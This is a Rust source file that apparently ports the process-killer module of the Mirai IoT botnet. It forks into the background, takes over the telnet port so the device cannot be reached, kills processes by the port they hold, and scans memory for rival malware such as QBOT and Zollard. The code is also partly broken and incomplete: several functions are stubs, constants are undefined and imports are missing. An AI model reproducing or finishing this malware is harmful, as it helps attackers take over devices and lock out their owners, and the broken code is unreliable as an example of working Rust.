use std::fs::{self, read_dir, File};
use std::io::{self, Read, Write};
use std::net::{IpAddr, Ipv4Addr, SocketAddr, TcpListener};
use std::os::unix::fs::MetadataExt;
use std::os::unix::io::AsRawFd;
use std::process::{self, Command};
use std::time::{Duration, SystemTime};

use libc::{kill, sockaddr_in, AF_INET, O_RDONLY, SIGINT, SIGKILL, SOCK_STREAM, SIGHUP};
use nix::fcntl::{fcntl, FcntlArg, OFlag};
use nix::sys::socket::{bind, listen, socket};
use nix::sys::signal::{sigaction, SaFlags, SigAction, SigHandler, SigSet, Signal};
use nix::unistd::{close, fork, getpid, ForkResult};
use nix::sys::stat::{fstat, Mode};

use crate::table::{table_init, table_lock_val, table_retrieve_val, table_unlock_val};
use crate::util::{util_local_addr, util_memcpy, util_strcmp, util_strlen, util_zero};

const KILLER_MIN_PID: i32 = 400;
const KILLER_RESTART_SCAN_TIME: i64 = 600;

const KILLER_REBIND_TELNET: bool = true;
const KILLER_REBIND_SSH: bool = false;
const KILLER_REBIND_HTTP: bool = false;

pub struct Killer {
    pid: i32,
    realpath: String,
    realpath_len: usize,
}

impl Killer {
    pub fn new() -> Self {
        Killer {
            pid: 0,
            realpath: String::new(),
            realpath_len: 0,
        }
    }

    pub fn init(&mut self) {
        let killer_highest_pid = KILLER_MIN_PID;
        let last_pid_scan = SystemTime::now();
        let mut scan_counter = 0;

        // Fork to let parent continue on main thread
        match fork().expect("Failed to fork process") {
            ForkResult::Parent { child } => {
                self.pid = child.as_raw();
                return;
            }
            ForkResult::Child => {}
        }

        // Rebind Telnet
        if KILLER_REBIND_TELNET {
            self.rebind_port(23);
        }

        // Rebind SSH
        if KILLER_REBIND_SSH {
            self.rebind_port(22);
        }

        // Rebind HTTP
        if KILLER_REBIND_HTTP {
            self.rebind_port(80);
        }

        // Sleep and get the real path in case binary is being deleted
        std::thread::sleep(Duration::from_secs(5));

        // Check if /proc/$pid/exe exists
        if !self.has_exe_access() {
            return;
        }

        // Memory scanning
        loop {
            let entries = read_dir("/proc").unwrap();
            for entry in entries {
                if let Ok(entry) = entry {
                    let file_name = entry.file_name();
                    if let Some(pid_str) = file_name.to_str() {
                        if pid_str.chars().all(char::is_numeric) {
                            let pid = pid_str.parse::<i32>().unwrap_or_default();
                            scan_counter += 1;

                            if pid <= killer_highest_pid {
                                if last_pid_scan.elapsed().unwrap().as_secs() as i64 > KILLER_RESTART_SCAN_TIME {
                                    self.restart_scan();
                                } else if pid > KILLER_MIN_PID && scan_counter % 10 == 0 {
                                    std::thread::sleep(Duration::from_secs(1));
                                }
                                continue;
                            }

                            self.scan_process(pid);
                        }
                    }
                }
            }
        }
    }

    fn rebind_port(&self, port: u16) {
        let addr = SocketAddr::new(IpAddr::V4(Ipv4Addr::UNSPECIFIED), port);
        if let Ok(listener) = TcpListener::bind(addr) {
            println!("Rebound port {}", port);
        } else {
            println!("Failed to rebind port {}", port);
        }
    }

    fn has_exe_access(&mut self) -> bool {
        let path = format!("/proc/{}/exe", getpid());
        if let Ok(metadata) = fs::metadata(&path) {
            self.realpath_len = metadata.size() as usize;
            if let Ok(realpath) = fs::read_link(&path) {
                self.realpath = realpath.to_str().unwrap_or_default().to_string();
                println!("Running from: {}", self.realpath);
                return true;
            }
        }
        false
    }

    fn scan_process(&self, pid: i32) {
        // Implement process scanning logic
    }

    fn restart_scan(&self) {
        println!("Restarting process scan...");
    }

    pub fn kill(&self) {
        kill(self.pid, SIGKILL);
    }

    pub fn kill_by_port(port: u16) -> bool {
        let port_str = format!("{:04X}", port);
        let fd = File::open("/proc/net/tcp").unwrap();
        let mut reader = io::BufReader::new(fd);
        let mut buffer = String::new();

        while reader.read_line(&mut buffer).unwrap() > 0 {
            if buffer.contains(&port_str) {
                let inode = buffer.split_whitespace().nth(9).unwrap_or_default().to_string();
                return Self::kill_by_inode(&inode);
            }
        }
        false
    }

    fn kill_by_inode(inode: &str) -> bool {
        for entry in read_dir("/proc").unwrap() {
            if let Ok(entry) = entry {
                let file_name = entry.file_name();
                if let Some(pid_str) = file_name.to_str() {
                    if pid_str.chars().all(char::is_numeric) {
                        let fd_dir = format!("/proc/{}/fd", pid_str);
                        if let Ok(fds) = read_dir(fd_dir) {
                            for fd in fds {
                                if let Ok(fd) = fd {
                                    let link = fs::read_link(fd.path()).unwrap_or_default();
                                    if link.to_str().unwrap_or_default().contains(inode) {
                                        let pid = pid_str.parse::<i32>().unwrap_or_default();
                                        kill(pid, SIGKILL);
                                        return true;
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
        false
    }

    fn memory_scan_match(path: &str) -> bool {
        let mut rdbuf = [0u8; 4096];
        let mut found = false;
    
        let fd = match File::open(path) {
            Ok(file) => file.as_raw_fd(),
            Err(_) => return false,
        };
    
        table_unlock_val(TABLE_MEM_QBOT);
        table_unlock_val(TABLE_MEM_QBOT2);
        table_unlock_val(TABLE_MEM_QBOT3);
        table_unlock_val(TABLE_MEM_UPX);
        table_unlock_val(TABLE_MEM_ZOLLARD);
    
        let m_qbot_report = table_retrieve_val(TABLE_MEM_QBOT);
        let m_qbot_http = table_retrieve_val(TABLE_MEM_QBOT2);
        let m_qbot_dup = table_retrieve_val(TABLE_MEM_QBOT3);
        let m_upx_str = table_retrieve_val(TABLE_MEM_UPX);
        let m_zollard = table_retrieve_val(TABLE_MEM_ZOLLARD);
    
        let mut file = unsafe { File::from_raw_fd(fd) };
    
        loop {
            let ret = file.read(&mut rdbuf);
            match ret {
                Ok(0) => break, // EOF reached
                Ok(n) => {
                    if mem_exists(&rdbuf[..n], m_qbot_report)
                        || mem_exists(&rdbuf[..n], m_qbot_http)
                        || mem_exists(&rdbuf[..n], m_qbot_dup)
                        || mem_exists(&rdbuf[..n], m_upx_str)
                        || mem_exists(&rdbuf[..n], m_zollard)
                    {
                        found = true;
                        break;
                    }
                }
                Err(_) => break,
            }
        }
    
        table_lock_val(TABLE_MEM_QBOT);
        table_lock_val(TABLE_MEM_QBOT2);
        table_lock_val(TABLE_MEM_QBOT3);
        table_lock_val(TABLE_MEM_UPX);
        table_lock_val(TABLE_MEM_ZOLLARD);
    
        found
    }

    fn mem_exists(buf: &[u8], str_: &[u8]) -> bool {
        buf.windows(str_.len()).any(|window| window == str_)
    }
}

